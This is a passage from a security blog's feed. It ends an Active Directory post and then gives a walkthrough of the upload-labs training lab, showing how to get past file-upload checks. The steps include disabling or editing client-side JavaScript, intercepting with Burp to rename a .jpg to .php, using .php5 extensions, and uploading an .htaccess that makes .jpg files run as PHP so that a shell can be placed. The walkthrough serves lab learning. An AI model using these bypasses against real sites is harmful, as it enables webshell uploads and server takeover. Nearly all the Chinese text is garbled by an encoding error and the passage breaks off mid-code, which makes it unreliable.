alt="image"></p><p><strong>æ³¨ï¼š</strong><br>é›†ä¸­èº«ä»½éªŒè¯ï¼Œå…¶å®å°±æ˜¯ä¸€æ¬¡æ€§å¯¹ä¸€ä¸ªç»„çš„æˆå‘˜è¿›è¡Œå…±äº«æˆæƒ</p><p>æŠŠåŸŸç”¨æˆ·æ·»åŠ åˆ°æœ¬åœ°ç®¡ç†å‘˜ç»„</p><p>åŸŸç®¡ç†å‘˜é»˜è®¤æ˜¯æœ¬åœ°ç®¡ç†å‘˜ç»„å†…æˆå‘˜</p><h3 id="0x07-ä½¿ç”¨ç»„ç­–ç•¥é›†ä¸­ç®¡ç†ç”¨æˆ·å’Œè®¡ç®—æœº"><a href="#0x07-ä½¿ç”¨ç»„ç­–ç•¥é›†ä¸­ç®¡ç†ç”¨æˆ·å’Œè®¡ç®—æœº" class="headerlink" title="0x07 ä½¿ç”¨ç»„ç­–ç•¥é›†ä¸­ç®¡ç†ç”¨æˆ·å’Œè®¡ç®—æœº"></a>0x07 ä½¿ç”¨ç»„ç­–ç•¥é›†ä¸­ç®¡ç†ç”¨æˆ·å’Œè®¡ç®—æœº</h3><hr><p>å¼ºåˆ¶æ›´æ–°ç»„ç­–ç•¥<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gpupdate /force</span><br></pre></td></tr></table></figure></p><p>è®¡ç®—æœºå¼€æœºé¦–å…ˆä¼šåˆ°DCæŸ¥çœ‹è®¡ç®—æœºæ‰€åœ¨ç»„çš„ç»„ç­–ç•¥</p><p>ç”¨æˆ·ç™»å½•æ—¶ï¼Œè®¡ç®—æœºä¼šå‘DCæŸ¥çœ‹ç”¨æˆ·æ‰€å±ç»„çš„ç»„ç­–ç•¥</p><p>ä½¿ç”¨ç»„ç­–ç•¥éƒ¨ç½²è½¯ä»¶æ—¶ï¼Œåªèƒ½éƒ¨ç½²msiç»“å°¾çš„æ–‡ä»¶</p><p>ä½¿ç”¨ç»„ç­–ç•¥ç®¡ç†å™¨å¯ä»¥è®¾ç½®ä½¿æ™®é€šåŸŸè´¦æˆ·ä¹Ÿå¯ä»¥ç™»å½•DC</p><p>åŸŸä¸­å¯ä»¥éƒ¨ç½²å¤šå°DCå®ç°å®¹é”™ï¼Œä½†è¦æ³¨æ„DNSä¹Ÿè¦å®ç°å®¹é”™å¹¶ä¸”åœ¨åŸŸä¸­çš„è®¡ç®—æœºä¸Šè¦è®¾ç½®å¤šä¸ªDNS</p><p>æ´»åŠ¨ç›®å½•ç«™ç‚¹å¯ä»¥æ§åˆ¶ç«™ç‚¹ä¹‹é—´çš„å¤åˆ¶ï¼Œè¿›è€Œä¼˜åŒ–ä¸¤ä¸ªä½¿ç”¨VPNé“¾æ¥çš„åŸŸä¹‹é—´çš„ç”¨æˆ·ç™»å½•ç­‰é—®é¢˜</p><h3 id="0x08-åŸŸä¸­ä¸»æ§"><a href="#0x08-åŸŸä¸­ä¸»æ§" class="headerlink" title="0x08 åŸŸä¸­ä¸»æ§"></a>0x08 åŸŸä¸­ä¸»æ§</h3><hr><p>PDCï¼šé˜²æ­¢ç«™ç‚¹åçš„é‡å¤ï¼›åŠ å¿«å¯†ç åŒæ­¥</p><p>RIDä¸»æ§ï¼šRIDå—ï¼Œé™åˆ¶ä¸€æ¬¡åˆ›å»ºç”¨æˆ·çš„æ•°é‡</p><p>åŸºç¡€æ¶æ„ä¸»æ§ï¼šè´Ÿè´£æ›´æ–°å…¶å®ƒåŸŸä¸­å¯¹æŸä¸ªå¯¹è±¡çš„å¼•ç”¨</p><p>æ³¨ï¼šä¸€ä¸ªåŸŸä¸­çš„ç¬¬ä¸€ä¸ªDCé»˜è®¤è´Ÿè´£ä»¥ä¸Šä¸‰ä¸ªåŠŸèƒ½</p><p>å¼ºåˆ¶æŸä¸ªDCæˆä¸ºåŸŸä¸­çš„PDC/RID/åŸºç¡€æ¶æ„ä¸»æ§</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ntdsutilå‘½ä»¤çš„ä½¿ç”¨</span><br></pre></td></tr></table></figure><p>æ³¨ï¼šå‰ææ˜¯æ­¤åŸŸæ—ä¸­çš„PDCåŸŸæ§åæ‰äº†æˆ–è€…é“¾æ¥ä¸ä¸Šäº†</p><h3 id="0x09-é™„å½•"><a href="#0x09-é™„å½•" class="headerlink" title="0x09 é™„å½•"></a>0x09 é™„å½•</h3><p>æ¨èï¼š</p><p><a href="http://edu.51cto.com/center/course/lesson/index?id=46874" target="_blank" rel="noopener">åŸºç¡€è§†é¢‘è¯¾ç¨‹</a></p><p><a href="http://docs.ioin.in/writeup/xianzhi.aliyun.com/_forum_read_805_html/index.html" target="_blank" rel="noopener">åŸŸæ¸—é€åŸºç¡€ç®€å•ä¿¡æ¯æ”¶é›†ï¼ˆåŸºç¡€ç¯‡ï¼‰</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;0x01-åŸºç¡€çŸ¥è¯†&quot;&gt;&lt;a href=&quot;#0x01-åŸºç¡€çŸ¥è¯†&quot; class=&quot;headerlink&quot; title=&quot;0x01 åŸºç¡€çŸ¥è¯†&quot;&gt;&lt;/a&gt;0x01 åŸºç¡€çŸ¥è¯†&lt;/h3&gt;&lt;hr&gt;
&lt;h4 id=&quot;å·¥ä½œç»„&quot;&gt;&lt;a href=&quot;#å·¥ä½œç»„&quot; class=&quot;heade
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>æ–‡ä»¶ä¸Šä¼ æ¼æ´å¤©ä¹¦</title>
    <link href="http://zer0yu.github.io/2018/06/18/upload-labs-note/"/>
    <id>http://zer0yu.github.io/2018/06/18/upload-labs-note/</id>
    <published>2018-06-18T07:00:26.000Z</published>
    <updated>2018-06-18T07:27:01.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x00-å‰è¨€"><a href="#0x00-å‰è¨€" class="headerlink" title="0x00 å‰è¨€"></a>0x00 å‰è¨€</h3><p>æ–‡ä»¶ä¸Šä¼ æ¼æ´å¯ä»¥è¯´æ˜¯getshellçš„ä¸€ç§å¥½æ–¹å¼äº†ï¼Œä¹Ÿæ˜¯å¸¸è§æ¼æ´ä¹‹ä¸€ï¼Œæœ¬æ–‡ç»“åˆ<a href="https://github.com/c0ny1/upload-labs" target="_blank" rel="noopener">upload-labs</a>æ¥å¯¹æ­¤ç§æ¼æ´åœ¨PHPä¸­çš„è¡¨ç°åšä¸€è®²è§£ã€‚æœ¬æ–‡åˆ—å‡ºçš„å‚è€ƒé“¾æ¥éƒ½æ˜¯ä¸€äº›ä¸é”™çš„æ–‡ç« ï¼Œåƒå…³äºä¸€äº›wafçš„ä¸Šä¼ bypassåœ¨æœ¬æ–‡ä¸ä½œè®²è§£ä½†æ˜¯åœ¨å‚è€ƒé“¾æ¥çš„æ–‡ç« ä¸­å°±æœ‰åŒ…å«ã€‚</p><h3 id="0x01-Pass-01"><a href="#0x01-Pass-01" class="headerlink" title="0x01 Pass-01"></a>0x01 Pass-01</h3><p>è¿™æ˜¯ä¸€ä¸ªå‰ç«¯éªŒè¯çš„ä¸Šä¼ ç‚¹ï¼Œé’ˆå¯¹è¿™ç§æƒ…å†µæˆ‘ä»¬ä¸€èˆ¬æœ‰ä»¥ä¸‹4ç§ç»•è¿‡æ–¹æ³•ã€‚</p><h4 id="1-ç¦ç”¨js"><a href="#1-ç¦ç”¨js" class="headerlink" title="(1) ç¦ç”¨js"></a>(1) ç¦ç”¨js</h4><p>firefoxå’Œchromeå‡æœ‰ç¦ç”¨jsè®¾ç½®ï¼Œç¦ç”¨äº†å°±å¯ä»¥ç»•è¿‡ã€‚</p><h4 id="2-ä¸Šä¼ æŒ‰é’®å¤„ä¿®æ”¹"><a href="#2-ä¸Šä¼ æŒ‰é’®å¤„ä¿®æ”¹" class="headerlink" title="(2) ä¸Šä¼ æŒ‰é’®å¤„ä¿®æ”¹"></a>(2) ä¸Šä¼ æŒ‰é’®å¤„ä¿®æ”¹</h4><p>æ‰“å¼€webæ§åˆ¶å°åˆ é™¤å¦‚å›¾æ‰€ç¤ºå¤„çš„<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">onsubmit=<span class="string">"return checkFile()"</span></span><br></pre></td></tr></table></figure></p><p><img src="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-06-16%20%E4%B8%8B%E5%8D%889.47.30.png" alt></p><h4 id="3-æ„é€ ä¸Šä¼ ç‚¹"><a href="#3-æ„é€ ä¸Šä¼ ç‚¹" class="headerlink" title="(3) æ„é€ ä¸Šä¼ ç‚¹"></a>(3) æ„é€ ä¸Šä¼ ç‚¹</h4><p>ä¸2çš„åŸç†æ˜¯ç›¸åŒçš„ï¼Œä½¿ç”¨äº†å’ŒåŸæ¥ä»£ç ä¸€æ ·ä½†æ˜¯ä¸åŒ…å«<code>onsubmit=&quot;return checkFile()&quot;</code>è¿™å¥ä»£ç </p><p>Like</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>upload-php<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"upload_panel"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ol</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">h3</span>&gt;</span>ä¸Šä¼ åŒº<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"æ­¤å¤„å¡«å†™å®Œæ•´çš„ä¸Šä¼ ç‚¹URL"</span> <span class="attr">enctype</span>=<span class="string">"multipart/form-data"</span> <span class="attr">method</span>=<span class="string">"post"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">p</span>&gt;</span>è¯·é€‰æ‹©è¦ä¸Šä¼ çš„å›¾ç‰‡ï¼š<span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">input</span> <span class="attr">class</span>=<span class="string">"input_file"</span> <span class="attr">type</span>=<span class="string">"file"</span> <span class="attr">name</span>=<span class="string">"upload_file"</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">input</span> <span class="attr">class</span>=<span class="string">"button"</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">name</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"ä¸Šä¼ "</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">ol</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="4-ä¿®æ”¹jsä»£ç "><a href="#4-ä¿®æ”¹jsä»£ç " class="headerlink" title="(4) ä¿®æ”¹jsä»£ç "></a>(4) ä¿®æ”¹jsä»£ç </h4><p>åªéœ€è¦ä¿®æ”¹jsä»£ç ä¸­çš„é™åˆ¶ï¼Œè®©å…¶åŒ…å«ä½ æƒ³ä¸Šä¼ çš„åç¼€åå³å¯ã€‚</p><p>æ­¤å¤„æˆ‘ä»¬åœ¨checkFile()å‡½æ•°ä¸­çš„allow_extå˜é‡ä¸­åŠ å…¥.phpï¼Œä¹‹ååœ¨console runä¸€ä¸‹è¿™æ®µä»£ç ï¼Œéšåä¸Šä¼ ä¾¿å¯æˆåŠŸã€‚</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> file = <span class="built_in">document</span>.getElementsByName(<span class="string">'upload_file'</span>)[<span class="number">0</span>].value;</span><br><span class="line">    <span class="keyword">if</span> (file == <span class="literal">null</span> || file == <span class="string">""</span>) &#123;</span><br><span class="line">        alert(<span class="string">"è¯·é€‰æ‹©è¦ä¸Šä¼ çš„æ–‡ä»¶!"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//å®šä¹‰å…è®¸ä¸Šä¼ çš„æ–‡ä»¶ç±»å‹</span></span><br><span class="line">    <span class="keyword">var</span> allow_ext = <span class="string">".jpg|.png|.gif.|.php"</span>;</span><br><span class="line">    <span class="comment">//æå–ä¸Šä¼ æ–‡ä»¶çš„ç±»å‹</span></span><br><span class="line">    <span class="keyword">var</span> ext_name = file.substring(file.lastIndexOf(<span class="string">"."</span>));</span><br><span class="line">    <span class="comment">//åˆ¤æ–­ä¸Šä¼ æ–‡ä»¶ç±»å‹æ˜¯å¦å…è®¸ä¸Šä¼ </span></span><br><span class="line">    <span class="keyword">if</span> (allow_ext.indexOf(ext_name) == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> errMsg = <span class="string">"è¯¥æ–‡ä»¶ä¸å…è®¸ä¸Šä¼ ï¼Œè¯·ä¸Šä¼ "</span> + allow_ext + <span class="string">"ç±»å‹çš„æ–‡ä»¶,å½“å‰æ–‡ä»¶ç±»å‹ä¸ºï¼š"</span> + ext_name;</span><br><span class="line">        alert(errMsg);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>####(5) ç¥å™¨burp</p><p>å…ˆå°†æƒ³è¦ä¸Šä¼ çš„phpè„šæœ¬çš„åç¼€ä¿®æ”¹ä¸ºjpgç»•è¿‡å‰ç«¯ï¼Œä½¿ç”¨burpæˆªæ–­åä¿®æ”¹jpgä¸ºphpç»§ç»­ä¸Šä¼ å³å¯ã€‚<br><img src="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-06-16%20%E4%B8%8B%E5%8D%8810.14.06.png" alt="image"></p><h3 id="0x02-Pass-02"><a href="#0x02-Pass-02" class="headerlink" title="0x02 Pass-02"></a>0x02 Pass-02</h3><p>æŸ¥çœ‹ä»£ç å‘ç°æ˜¯åœ¨æœåŠ¡ç«¯å¯¹æ–‡ä»¶çš„mimeç±»å‹è¿›è¡Œäº†æ ¡éªŒã€‚å¯¹äºè¿™ç§æƒ…å†µæˆ‘ä»¬åªéœ€è¦ä½¿ç”¨burpæŠ“åŒ…å¹¶ä¿®æ”¹content-typeå­—æ®µçš„å†…å®¹å³å¯ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists($UPLOAD_ADDR)) &#123;</span><br><span class="line">        <span class="comment">// ä»¥ä¸‹è¿™ä¸ªåˆ¤æ–­æ˜¯åœ¨å¯¹ä¸Šä¼ æ–‡ä»¶çš„mimeç±»å‹åšåˆ¤æ–­</span></span><br><span class="line">        <span class="keyword">if</span> (($_FILES[<span class="string">'upload_file'</span>][<span class="string">'type'</span>] == <span class="string">'image/jpeg'</span>) || ($_FILES[<span class="string">'upload_file'</span>][<span class="string">'type'</span>] == <span class="string">'image/png'</span>) || ($_FILES[<span class="string">'upload_file'</span>][<span class="string">'type'</span>] == <span class="string">'image/gif'</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>], $UPLOAD_ADDR . <span class="string">'/'</span> . $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>])) &#123;</span><br><span class="line">                $img_path = $UPLOAD_ADDR . $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>];</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'æ–‡ä»¶ç±»å‹ä¸æ­£ç¡®ï¼Œè¯·é‡æ–°ä¸Šä¼ ï¼'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = $UPLOAD_ADDR.<span class="string">'æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-06-16%20%E4%B8%8B%E5%8D%8810.23.57.png" alt="image"></p><h3 id="0x03-Pass-03"><a href="#0x03-Pass-03" class="headerlink" title="0x03 Pass-03"></a>0x03 Pass-03</h3><p>çœ‹äº†ä¸‹ä»£ç å‘ç°é»‘åå•å¯¹å¸¸è§æ–‡ä»¶åè¿›è¡Œäº†è¿‡æ»¤ï¼Œä½†æ˜¯ç±»ä¼¼äºâ€.php5â€,â€.php4â€,â€.php3â€,â€.php2â€,â€php1â€è¿™æ ·çš„ä¹Ÿæ˜¯å¯ä»¥è¢«å½“åšphpè¿›è¡Œè§£æçš„ã€‚æ‰€ä»¥æˆ‘ä»¬è¿™æ—¶åªéœ€è¦å°†æ–‡ä»¶åä¿®æ”¹ä¸º.php5å°±å¯ä»¥æˆåŠŸä¸Šä¼ shell<br>æ³¨: è¿™ä¸ªä¹Ÿæ˜¯è¦æœåŠ¡å™¨æ”¯æŒçš„ï¼Œå¦‚æœå‘ç°ä¸èƒ½è§£æå¯ä»¥åœ¨apacheé…ç½®æ–‡ä»¶ä¸­æ·»åŠ å¦‚ä¸‹è®¾ç½®</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType Application/x-httpd-php .php .php3 .php5 .html</span><br></pre></td></tr></table></figure><p><img src="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-06-17%20%E4%B8%8A%E5%8D%8811.58.09.png" alt="image"><br><img src="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-06-17%20%E4%B8%8A%E5%8D%8811.58.21.png" alt="image"></p><h3 id="0x04-Pass-04"><a href="#0x04-Pass-04" class="headerlink" title="0x04 Pass-04"></a>0x04 Pass-04</h3><p>å…ˆçœ‹ä¸‹ä»£ç ï¼Œæ­¤å¤„è¿‡æ»¤çš„å¾ˆä¸¥ï¼Œæ‰€ä»¥æ­¤æ—¶è¦è€ƒè™‘ä¸‹apacheçš„è§£æç‰¹æ€§ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists($UPLOAD_ADDR)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>,<span class="string">".php5"</span>,<span class="string">".php4"</span>,<span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">"php1"</span>,<span class="string">".html"</span>,<span class="string">".htm"</span>,<span class="string">".phtml"</span>,<span class="string">".pHp"</span>,<span class="string">".pHp5"</span>,<span class="string">".pHp4"</span>,<span class="string">".pHp3"</span>,<span class="string">".pHp2"</span>,<span class="string">"pHp1"</span>,<span class="string">".Html"</span>,<span class="string">".Htm"</span>,<span class="string">".pHtml"</span>,<span class="string">".jsp"</span>,<span class="string">".jspa"</span>,<span class="string">".jspx"</span>,<span class="string">".jsw"</span>,<span class="string">".jsv"</span>,<span class="string">".jspf"</span>,<span class="string">".jtml"</span>,<span class="string">".jSp"</span>,<span class="string">".jSpx"</span>,<span class="string">".jSpa"</span>,<span class="string">".jSw"</span>,<span class="string">".jSv"</span>,<span class="string">".jSpf"</span>,<span class="string">".jHtml"</span>,<span class="string">".asp"</span>,<span class="string">".aspx"</span>,<span class="string">".asa"</span>,<span class="string">".asax"</span>,<span class="string">".ascx"</span>,<span class="string">".ashx"</span>,<span class="string">".asmx"</span>,<span class="string">".cer"</span>,<span class="string">".aSp"</span>,<span class="string">".aSpx"</span>,<span class="string">".aSa"</span>,<span class="string">".aSax"</span>,<span class="string">".aScx"</span>,<span class="string">".aShx"</span>,<span class="string">".aSmx"</span>,<span class="string">".cEr"</span>,<span class="string">".sWf"</span>,<span class="string">".swf"</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//è½¬æ¢ä¸ºå°å†™</span></span><br><span class="line">        $file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//å»é™¤å­—ç¬¦ä¸²::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//æ”¶å°¾å»ç©º</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>], $UPLOAD_ADDR . <span class="string">'/'</span> . $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>])) &#123;</span><br><span class="line">                $img_path = $UPLOAD_ADDR . $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>];</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'æ­¤æ–‡ä»¶ä¸å…è®¸ä¸Šä¼ !'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = $UPLOAD_ADDR . <span class="string">'æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…ˆä»‹ç»ä¸‹.htaccessæ–‡ä»¶:</p><p>(1) .htaccessæ˜¯ä¸€ä¸ªçº¯æ–‡æœ¬æ–‡ä»¶ï¼Œå®ƒé‡Œé¢å­˜æ”¾ç€ApacheæœåŠ¡å™¨é…ç½®ç›¸å…³çš„æŒ‡ä»¤ã€‚</p><p>(2) .htaccessä¸»è¦çš„ä½œç”¨æœ‰ï¼šURLé‡å†™ã€è‡ªå®šä¹‰é”™è¯¯é¡µé¢ã€MIMEç±»å‹é…ç½®ä»¥åŠè®¿é—®æƒé™æ§åˆ¶ç­‰ã€‚ä¸»è¦ä½“ç°åœ¨ä¼ªé™æ€çš„åº”ç”¨ã€å›¾ç‰‡é˜²ç›—é“¾ã€è‡ªå®šä¹‰404é”™è¯¯é¡µé¢ã€é˜»æ­¢/å…è®¸ç‰¹å®šIP/IPæ®µã€ç›®å½•æµè§ˆä¸ä¸»é¡µã€ç¦æ­¢è®¿é—®æŒ‡å®šæ–‡ä»¶ç±»å‹ã€æ–‡ä»¶å¯†ç ä¿æŠ¤ç­‰ã€‚</p><p>(3) .htaccessçš„ç”¨é€”èŒƒå›´ä¸»è¦é’ˆå¯¹å½“å‰ç›®å½•ã€‚</p><p>ç”±ä¸Šé¢å¯çŸ¥åœ¨æ­¤å¤„æˆ‘ä»¬å¯ä»¥å…ˆä¸Šä¼ ä¸€ä¸ª.htaccessæ–‡ä»¶ï¼Œæ¥ä½¿apacheå¯ä»¥å°†jpgæ–‡ä»¶å½“åšphpæ–‡ä»¶è§£æï¼Œä½†è¦æ³¨æ„å¹¶ä¸æ˜¯ä»»ä½•æ—¶å€™éƒ½å¯ä»¥ä¸Šä¼ ä¸€ä¸ªæœ‰æ•ˆçš„.htaccessæ–‡ä»¶çš„ï¼Œåœ¨è®©.htaccessæ–‡ä»¶ç”Ÿæ•ˆä¹‹å‰æˆ‘ä»¬éœ€è¦åšä¸¤ç‚¹é…ç½®ï¼š</p><p>(1) ä¿®æ”¹httpd.confï¼Œå¯ç”¨AllowOverrideï¼Œå³å°†å¦‚ä¸‹ä»£ç </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AllowOverride None</span><br></pre></td></tr></table></figure><p>ä¿®æ”¹ä¸º</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AllowOverride All</span><br></pre></td></tr></table></figure><p>(2) ä¿®æ”¹httpd.confï¼Œå¢åŠ å¦‚ä¸‹è¯­å¥</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LoadModule rewrite_module modules/mod_rewrite.so</span><br></pre></td></tr></table></figure><p>ç¬¬ä¸€æ­¥: åœ¨.htaccessæ–‡ä»¶ä¸­å†™å…¥å¦‚ä¸‹å†…å®¹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php .jpg</span><br></pre></td></tr></table></figure><p>ä¸Šä¼ .htaccess<br>ç¬¬äºŒæ­¥: ä¿®æ”¹shell.phpä¸ºshell.jpgç„¶åè®¿é—®å³å¯å‘ç°æœåŠ¡å™¨å¯¹å…¶è¿›è¡Œäº†è§£æ</p><p>æ³¨: æ­¤å¤„çš„æ–¹æ³•åœ¨Pass-03ä¸­ä¹Ÿæ˜¯å¯ä»¥ä½¿ç”¨çš„</p><h3 id="0x05-Pass-05"><a href="#0x05-Pass-05" class="headerlink" title="0x05 Pass-05"></a>0x05 Pass-05</h3><p>é¦–å…ˆåˆ†æä»£ç ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°è¿™å¥<code>$file_ext = strrchr($file_name, 